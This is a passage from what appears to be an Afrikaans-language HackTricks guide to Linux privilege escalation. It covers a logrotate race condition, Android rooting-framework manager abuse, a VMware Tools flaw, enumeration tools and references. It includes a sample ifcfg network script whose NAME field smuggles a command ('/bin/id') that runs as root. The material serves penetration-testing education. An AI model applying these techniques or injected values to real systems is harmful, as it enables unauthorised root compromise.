'n Kwesbaarheid in `logrotate` laat gebruikers met **skryftoestemmings** op 'n loglêer of sy ouer-gidse moontlik verhoogde voorregte verkry. Dit is omdat `logrotate`, wat dikwels as **root** loop, gemanipuleer kan word om arbitrêre lêers uit te voer, veral in gidse soos _**/etc/bash_completion.d/**_. Dit is belangrik om toestemmings nie net in _/var/log_ na te gaan nie, maar ook in enige gids waar logrotasie toegepas word.

> [!TIP]
> Hierdie kwesbaarheid raak `logrotate`-weergawe `3.18.0` en ouer

Meer gedetailleerde inligting oor die kwesbaarheid kan op hierdie bladsy gevind word: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Jy kan hierdie kwesbaarheid met [**logrotten**](https://github.com/whotwagner/logrotten) uitbuit.

Hierdie kwesbaarheid stem baie ooreen met [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** dus, wanneer jy vind dat jy logs kan wysig, gaan na wie daardie logs bestuur en kyk of jy voorregte kan eskaleer deur die logs met simboliese skakels te vervang.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Kwesbaarheidsverwysing:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

As 'n gebruiker om watter rede ook al 'n `ifcf-<whatever>`-skrip na _/etc/sysconfig/network-scripts_ kan **skryf**, **of** 'n bestaande een kan **aanpas**, dan is jou **stelsel pwned**.<sup>[[20]](#references)</sup>

Netwerkskripte, byvoorbeeld _ifcg-eth0_, word vir netwerkverbindings gebruik. Hulle lyk presies soos .INI-lêers. Hulle word egter op Linux deur Network Manager (dispatcher.d) \~sourced\~.

In my geval word die `NAME=`-attribuut in hierdie netwerkskripte nie korrek hanteer nie. As daar **wit/leë spasie in die naam is, probeer die stelsel die gedeelte ná die wit/leë spasie uitvoer**. Dit beteken dat **alles ná die eerste leë spasie as root uitgevoer word**.

Byvoorbeeld: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Let op die leë spasie tussen Network en /bin/id_)

### **init, init.d, systemd, en rc.d**

Die gids `/etc/init.d` bevat **scripts** vir System V init (SysVinit), die **klassieke Linux-diensbestuurstelsel**. Dit sluit scripts in om dienste te `start`, `stop`, `restart`, en soms te `reload`. Dit kan direk uitgevoer word of deur simboliese skakels wat in `/etc/rc?.d/` gevind word. ’n Alternatiewe pad in Redhat-stelsels is `/etc/rc.d/init.d`.

Aan die ander kant word `/etc/init` met **Upstart** geassosieer, ’n nuwer **diensbestuurstelsel** wat deur Ubuntu bekendgestel is en konfigurasielêers vir diensbestuurtake gebruik. Ondanks die oorgang na Upstart word SysVinit-scripts steeds saam met Upstart-konfigurasies gebruik weens ’n versoenbaarheidslaag in Upstart.

**systemd** tree na vore as ’n moderne initialiserings- en diensbestuurder, wat gevorderde funksies bied soos die begin van daemons op aanvraag, automount-bestuur, en momentopnames van die stelseltoestand. Dit organiseer lêers in `/usr/lib/systemd/` vir verspreidingspakkette en `/etc/systemd/system/` vir administrateurwysigings, wat die stelseladministrasieproses stroomlyn.<sup>[[21]](#references)</sup>

## Ander Tricks

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Ontsnap uit beperkte Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: misbruik van manager-kanale

Android rooting frameworks hook gewoonlik ’n syscall om bevoorregte kernelfunksionaliteit aan ’n userspace-manager bloot te stel. Swak manager-verifikasie (bv. signature checks gebaseer op FD-order of swak wagwoords​kemas) kan ’n plaaslike app in staat stel om die manager na te boots en na root te eskaleer op toestelle wat reeds geroot is. Vind hier meer uit oor die besonderhede van die uitbuiting:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-gedrewe diensontdekking in VMware Tools/Aria Operations kan ’n binêre pad uit proses-opdraglyne onttrek en dit met -v onder ’n bevoorregte konteks uitvoer. Toegeeflike patrone (bv. die gebruik van \S) kan aanvaller-geplaasde listeners in skryfbare liggings (bv. /tmp/httpd) pas, wat tot uitvoering as root kan lei (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Vind hier meer uit en sien ’n veralgemeende patroon wat op ander discovery/monitoring stacks van toepassing is:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Meer hulp

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Beste tool om Linux local privilege escalation vectors te soek:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel-vulnerabilities in Linux en MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fisiese toegang):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Hersameling van meer scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (Crontab UI privesc, hergebruik van zip -P credentials)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: vervalste .text_sig payload vir monitor wat deur cron uitgevoer word](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Basiese Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux Privilege Escalation Guide](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Aanval en verdediging: Linux Privilege Escalation Techniques van 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Niemand het command execution verwag nie!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux Privilege Escalation)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Lab Exercises Walkthrough - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Wenke en Tricks vir Linux Privilege Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Linux Enumeration & Privilege Escalation tool](https://github.com/rtcrowley/linux-private-i)
- [14] [Wat is ’n Socket?](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Kry toegang tot die D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables Linux Privilege Escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Part-2 – Linux Privilege Escalation](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Hoe om ACLs op Linux te bestuur](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Redhat/CentOS root deur network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Wat is systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (bash arithmetic injection via logs, algehele ketting)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Manual – BASH_ENV (nie-interaktiewe opstartlêer)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot Elevation of Privilege](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 and CVE-2025-32463 Sudo elevation-of-privilege vulnerabilities](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [32] [Python importlib docs](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet deur @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Logging van wagwoorde op Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Besonderhede van ’n logrotate race condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
